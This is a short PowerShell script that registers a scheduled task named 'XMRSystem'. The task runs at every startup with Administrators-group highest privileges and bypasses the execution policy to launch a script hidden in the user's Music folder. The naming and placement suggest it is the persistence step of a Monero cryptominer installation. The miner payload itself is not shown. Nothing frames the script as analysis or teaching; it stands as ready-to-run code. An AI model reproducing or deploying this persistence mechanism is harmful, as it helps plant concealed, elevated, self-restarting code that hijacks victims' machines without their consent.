﻿$A = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy bypass file c:\Users\$env:USERNAME\Music\XMRSystem.ps1"
$T = New-ScheduledTaskTrigger -AtStartup
$P = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
$S = New-ScheduledTaskSettingsSet
$D = New-ScheduledTask -Action $A -Principal $P -Trigger $T -Settings $S
Register-ScheduledTask XMRSystem -InputObject $D -Force